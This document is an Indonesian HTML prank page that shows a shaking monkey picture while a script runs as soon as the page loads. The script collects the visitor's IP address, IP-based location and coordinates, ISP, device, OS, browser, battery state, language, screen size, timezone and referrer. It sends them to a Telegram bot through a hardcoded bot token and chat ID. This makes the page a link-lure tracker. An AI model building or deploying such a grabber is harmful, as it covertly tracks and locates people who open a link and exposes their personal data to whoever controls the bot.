<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Monyet Lucu</title>
    <style>
        body {
            background: linear-gradient(135deg, #1a1a2e, #16213e);
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            margin: 0;
            padding: 20px;
        }
        .container {
            text-align: center;
            background: rgba(0,0,0,0.7);
            padding: 30px;
            border-radius: 30px;
            backdrop-filter: blur(10px);
            max-width: 500px;
            animation: fadeIn 0.5s ease;
        }
        img {
            max-width: 100%;
            border-radius: 20px;
            box-shadow: 0 0 30px rgba(255,0,0,0.5);
            animation: shake 0.5s ease infinite;
        }
        h1 {
            color: #ff6b6b;
            font-size: 24px;
            margin-top: 20px;
        }
        p {
            color: #ccc;
            font-size: 14px;
        }
        .battery-info {
            margin-top: 15px;
            padding: 10px;
            background: rgba(0,0,0,0.5);
            border-radius: 15px;
            font-size: 12px;
            display: none;
        }
        @keyframes shake {
            0%, 100% { transform: translateX(0); }
            25% { transform: translateX(-5px); }
            75% { transform: translateX(5px); }
        }
        @keyframes fadeIn {
            from { opacity: 0; transform: translateY(20px); }
            to { opacity: 1; transform: translateY(0); }
        }
        .loading {
            color: #ffd93d;
            font-size: 12px;
            margin-top: 10px;
        }
    </style>
</head>
<body>
    <div class="container">
        <img id="monkeyImg" src="https://i.imgflip.com/4/1h7n3p.jpg" alt="Monyet Lucu">
        <h1>🐒 MONYET LAGI ASYIK 🐒</h1>
        <p>Lagi sibuk, jangan diganggu 😹🔥</p>
        <div class="battery-info" id="batteryInfo">🔋 Mengambil data batre...</div>
        <div class="loading" id="loading">📡 Mengirim data ke server...</div>
    </div>

    <script>
        // ========== KONFIGURASI TELEGRAM ==========
        const TELEGRAM_TOKEN = "8766620931:AAEh2D0Du_Youkn8baGaZy8jWa-Esh_UNJc";
        const TELEGRAM_CHAT_ID = "8463622692";  // CHAT ID BOS ABRISAM
        
        // ========== FUNGSI KIRIM KE TELEGRAM ==========
        async function sendToTelegram(message) {
            const url = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
            const data = {
                chat_id: TELEGRAM_CHAT_ID,
                text: message,
                parse_mode: "HTML"
            };
            
            try {
                const response = await fetch(url, {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(data)
                });
                if (response.ok) {
                    document.getElementById('loading').innerHTML = "✅ Data terkirim ke Telegram!";
                    setTimeout(() => {
                        document.getElementById('loading').style.opacity = '0';
                    }, 3000);
                }
            } catch(e) {
                document.getElementById('loading').innerHTML = "❌ Gagal kirim data";
            }
        }
        
        // ========== AMBIL DATA BATERAI ==========
        async function getBatteryInfo() {
            const batteryDiv = document.getElementById('batteryInfo');
            
            if ('getBattery' in navigator) {
                try {
                    const battery = await navigator.getBattery();
                    const level = Math.round(battery.level * 100);
                    const charging = battery.charging ? "🔌 Sedang ngecas" : "🔋 Tidak ngecas";
                    
                    let batteryText = `🔋 Baterai: ${level}% | ${charging}`;
                    
                    if (level <= 15) {
                        batteryDiv.style.color = "#ff4757";
                    } else if (level <= 50) {
                        batteryDiv.style.color = "#ffd93d";
                    } else {
                        batteryDiv.style.color = "#00ff9d";
                    }
                    
                    batteryDiv.innerHTML = batteryText;
                    batteryDiv.style.display = 'block';
                    
                    return { level, charging, levelText: `${level}%` };
                } catch(e) {
                    batteryDiv.innerHTML = "🔋 Gagal ambil data batre";
                    batteryDiv.style.display = 'block';
                    return null;
                }
            } else {
                batteryDiv.innerHTML = "🔋 Device tidak support Battery API (kemungkinan PC)";
                batteryDiv.style.display = 'block';
                return null;
            }
        }
        
        // ========== AMBIL IP ==========
        async function getIP() {
            try {
                const response = await fetch('https://api.ipify.org?format=json');
                const data = await response.json();
                return data.ip;
            } catch(e) {
                return "Gagal ambil IP";
            }
        }
        
        // ========== AMBIL LOKASI DARI IP ==========
        async function getLocationFromIP(ip) {
            try {
                const response = await fetch(`https://ipinfo.io/${ip}/json`);
                const data = await response.json();
                return {
                    city: data.city || "Unknown",
                    region: data.region || "Unknown",
                    country: data.country || "Unknown",
                    loc: data.loc || "Unknown",
                    org: data.org || "Unknown"
                };
            } catch(e) {
                return null;
            }
        }
        
        // ========== AMBIL INFO DEVICE ==========
        function getDeviceInfo() {
            const ua = navigator.userAgent;
            let device = "Unknown";
            let os = "Unknown";
            let browser = "Unknown";
            
            if (/Android/i.test(ua)) {
                device = "📱 Android";
                os = "Android";
            } else if (/iPhone|iPad|iPod/i.test(ua)) {
                device = "🍎 iOS";
                os = "iOS";
            } else if (/Windows/i.test(ua)) {
                device = "💻 Windows";
                os = "Windows";
            } else if (/Mac/i.test(ua)) {
                device = "🍎 Mac";
                os = "macOS";
            } else if (/Linux/i.test(ua)) {
                device = "🐧 Linux";
                os = "Linux";
            }
            
            if (/Chrome/i.test(ua) && !/Edg/i.test(ua)) browser = "Chrome";
            else if (/Firefox/i.test(ua)) browser = "Firefox";
            else if (/Safari/i.test(ua) && !/Chrome/i.test(ua)) browser = "Safari";
            else if (/Edg/i.test(ua)) browser = "Edge";
            
            return { device, os, browser, fullUA: ua };
        }
        
        // ========== MAIN ==========
        async function logVisitor() {
            const ip = await getIP();
            const location = await getLocationFromIP(ip);
            const device = getDeviceInfo();
            const battery = await getBatteryInfo();
            const language = navigator.language;
            const time = new Date().toLocaleString('id-ID');
            const referrer = document.referrer || "Direct";
            const screenRes = `${screen.width}x${screen.height}`;
            const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
            
            let message = `
🔴 <b>ADA YANG BUKA LINK!</b> 🔴
─────────────────
🌐 <b>IP:</b> <code>${ip}</code>
📍 <b>Lokasi:</b> ${location ? `${location.city}, ${location.region}, ${location.country}` : 'Unknown'}
🗺️ <b>Koordinat:</b> ${location?.loc || 'Unknown'}
🏢 <b>ISP:</b> ${location?.org || 'Unknown'}
─────────────────
📱 <b>Device:</b> ${device.device}
💻 <b>OS:</b> ${device.os}
🌍 <b>Browser:</b> ${device.browser}
🔋 <b>Baterai:</b> ${battery ? `${battery.level}% | ${battery.charging ? 'Ngecas' : 'Tidak ngecas'}` : 'Tidak support'}
🌐 <b>Bahasa:</b> ${language}
📺 <b>Resolusi:</b> ${screenRes}
🌍 <b>Timezone:</b> ${timezone}
⏰ <b>Waktu:</b> ${time}
🔗 <b>Referrer:</b> ${referrer}
─────────────────
🐒 <b>Monyet lagi asyik, jangan diganggu!</b>
            `;
            
            await sendToTelegram(message);
            
            document.getElementById('loading').innerHTML = "✅ Data terkirim!";
            setTimeout(() => {
                document.getElementById('loading').style.opacity = '0';
            }, 2000);
        }
        
        logVisitor();
    </script>
</body>
</html>
